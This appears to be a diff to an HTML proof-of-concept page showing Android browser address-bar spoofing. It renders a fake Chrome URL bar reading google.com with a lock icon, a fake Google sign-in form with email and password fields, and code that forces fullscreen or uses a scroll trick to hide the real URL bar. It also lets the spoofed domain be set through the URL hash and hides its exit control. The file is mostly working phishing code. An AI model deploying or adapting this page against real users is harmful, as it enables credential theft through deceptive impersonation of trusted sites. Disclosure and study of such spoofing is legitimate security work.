@@ -1,94 +1,245 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+  <meta charset="utf-8" />
+  <title>Android Fullscreen Spoof PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
   <style>
-    body, html {
+    :root { --vh: 1vh; }
+
+    html, body {
       margin: 0;
       padding: 0;
       height: 100%;
-      width: 100%;
-      overflow: hidden;
-      font-family: Arial, sans-serif;
-      background: white;
+      background: #fff;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      overscroll-behavior: none;
+      -webkit-tap-highlight-color: transparent;
     }
-    /* Fake browser bar */
+
+    /* When fallback is active, lock the layout to screen */
+    body.fixed {
+      position: fixed;
+      inset: 0;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      touch-action: none;
+    }
+
+    /* Fake browser UI bar */
     .fake-bar {
-      background: #f1f3f4;
       height: 48px;
+      width: 100%;
+      background: #f1f3f4;
       display: flex;
       align-items: center;
-      padding: 0 10px;
+      gap: 8px;
+      padding: 0 12px;
+      box-sizing: border-box;
+      border-bottom: 1px solid #d0d0d0;
+      box-shadow: 0 2px 5px rgba(0,0,0,.12);
       font-size: 14px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      line-height: 1;
     }
-    .lock {
-      color: green;
-      margin-right: 5px;
-    }
+    .lock { color: #1e8e3e; }
     .url {
-      color: #000;
-      font-weight: 500;
-      font-size: 14px;
+      font-weight: 600;
+      color: #111;
       overflow: hidden;
       white-space: nowrap;
       text-overflow: ellipsis;
     }
-    /* Fake page content */
-    .content {
-      height: calc(100% - 48px);
-      padding: 20px;
+
+    /* Main app surface that fills the visual viewport height */
+    .app {
+      position: relative;
+      width: 100%;
+      height: calc(var(--vh) * 100 - 48px);
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      padding: 16px;
     }
-    h1 {
-      color: #202124;
-      font-size: 22px;
+
+    h1 { margin: 0 0 4px; font-size: 22px; color: #202124; }
+    p { margin: 0; color: #444; text-align: center; }
+
+    .field {
+      width: min(92vw, 420px);
+      padding: 12px 14px;
+      border: 1px solid #cfcfcf;
+      border-radius: 8px;
+      font-size: 16px;
     }
     .btn {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 12px 20px;
-      background: #4285f4;
-      color: #fff;
-      border-radius: 6px;
-      text-decoration: none;
-      font-size: 16px;
-    }
-    .fullscreen-btn {
-      position: absolute;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
       padding: 12px 18px;
-      background: #34a853;
+      border: 0;
+      border-radius: 8px;
+      background: #1a73e8;
       color: #fff;
-      border-radius: 6px;
+      font-weight: 600;
       font-size: 16px;
-      cursor: pointer;
+      width: min(92vw, 420px);
     }
+
+    .cta-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.65);
+      color: #fff;
+      display: grid;
+      place-items: center;
+      z-index: 9999;
+    }
+    .cta-card {
+      background: #121212;
+      padding: 18px 16px;
+      border-radius: 12px;
+      width: min(90vw, 420px);
+      text-align: center;
+      box-shadow: 0 6px 24px rgba(0,0,0,.45);
+    }
+    .cta-card h2 { margin: 0 0 8px; font-size: 18px; }
+    .cta-btn {
+      margin-top: 12px;
+      background: #34a853;
+      border: 0;
+      color: #fff;
+      font-weight: 700;
+      padding: 12px 16px;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    /* Tiny exit hit area (hidden look) for testers */
+    .exit {
+      position: fixed;
+      top: 6px;
+      right: 6px;
+      width: 14px;
+      height: 14px;
+      opacity: .12; /* looks invisible to users */
+      z-index: 9999;
+    }
+
+    /* Spacer used only for fallback scroll trick */
+    .spacer { display: none; height: 200vh; }
   </style>
 </head>
 <body>
-  <!-- Fake browser bar spoof -->
+  <!-- Fallback scroll spacer -->
+  <div id="spacer" class="spacer"></div>
+
+  <!-- Fake address bar -->
   <div class="fake-bar">
     <span class="lock">🔒</span>
-    <span class="url">https://www.google.com</span>
+    <span class="url" id="displayUrl">https://www.google.com</span>
   </div>
 
-  <!-- Attacker’s fake content -->
-  <div class="content">
+  <!-- Fake page content -->
+  <div class="app" id="app">
     <h1>Google Sign-In</h1>
-    <p>Please confirm your login to continue.</p>
-    <a href="#" class="btn">Sign in</a>
+    <p>Continue to your account</p>
+    <input class="field" placeholder="Email or phone" inputmode="email" />
+    <input class="field" placeholder="Enter your password" type="password" />
+    <button class="btn">Next</button>
   </div>
 
-  <!-- Button to trigger fullscreen spoof -->
-  <div class="fullscreen-btn" onclick="goFullscreen()">Enter Fullscreen</div>
+  <!-- Overlay to capture a trusted user gesture -->
+  <div class="cta-overlay" id="overlay">
+    <div class="cta-card">
+      <h2>Tap to continue</h2>
+      <p>This demo will enter fullscreen (or simulate it) to show spoofing risk on Android.</p>
+      <button class="cta-btn" id="goBtn">Continue</button>
+    </div>
+  </div>
+
+  <!-- Tiny exit area (for testers) -->
+  <div class="exit" title="Exit" id="exit"></div>
 
   <script>
-    function goFullscreen() {
-      document.querySelector('.fullscreen-btn').style.display = 'none';
-      window.scrollTo(0, 1); // hides the mobile browser bar in Android
+    // Keep CSS vh unit accurate on Android (accounts for dynamic toolbars)
+    function setVh() {
+      var h = (window.visualViewport ? window.visualViewport.height : window.innerHeight) * 0.01;
+      document.documentElement.style.setProperty('--vh', h + 'px');
     }
+    setVh();
+    window.addEventListener('resize', setVh);
+    if (window.visualViewport) window.visualViewport.addEventListener('resize', setVh);
+
+    const overlay = document.getElementById('overlay');
+    const spacer  = document.getElementById('spacer');
+    const exitBtn = document.getElementById('exit');
+    const goBtn   = document.getElementById('goBtn');
+
+    async function tryFullscreen() {
+      const el = document.documentElement;
+      const anyFull = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+      if (!anyFull) return false;
+
+      try {
+        if (el.requestFullscreen)       await el.requestFullscreen();
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        else if (el.msRequestFullscreen)     el.msRequestFullscreen();
+        // Give it a tick to settle
+        await new Promise(r => setTimeout(r, 50));
+        return !!(document.fullscreenElement || document.webkitFullscreenElement);
+      } catch (e) {
+        return false;
+      }
+    }
+
+    function fallbackScrollSpoof() {
+      // Make page scrollable, then scroll to hide the URL bar
+      spacer.style.display = 'block';
+      spacer.style.height  = '200vh';
+
+      // Small delay so Chrome can layout heights
+      setTimeout(() => {
+        window.scrollTo(0, document.body.scrollHeight - 1);
+        // After the toolbar hides, lock the layout to screen
+        setTimeout(() => {
+          document.body.classList.add('fixed');
+          // Return to top with fake bar pinned
+          window.scrollTo(0, 0);
+        }, 550);
+      }, 30);
+    }
+
+    async function beginSpoof() {
+      overlay.style.display = 'none';
+
+      // 1) Try real fullscreen (works on Android Chrome with user gesture)
+      const fs = await tryFullscreen();
+
+      // 2) If not in fullscreen, do CSS scroll spoof fallback
+      if (!fs) fallbackScrollSpoof();
+    }
+
+    goBtn.addEventListener('click', beginSpoof);
+
+    // Tester exit: exit fullscreen & reset
+    exitBtn.addEventListener('click', async () => {
+      if (document.exitFullscreen)      await document.exitFullscreen().catch(()=>{});
+      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+      spacer.style.display = 'none';
+      document.body.classList.remove('fixed');
+      overlay.style.display = 'grid';
+      window.scrollTo(0, 0);
+      setVh();
+    });
+
+    // Optional: set a spoof target via hash, e.g., #coinbase.com
+    // Example: https://yourhost/poc.html#accounts.google.com
+    (function setTargetFromHash(){
+      const h = (location.hash || '').replace(/^#/, '').trim();
+      if (h) document.getElementById('displayUrl').textContent = 'https://' + h;
+    })();
   </script>
 </body>
 </html>
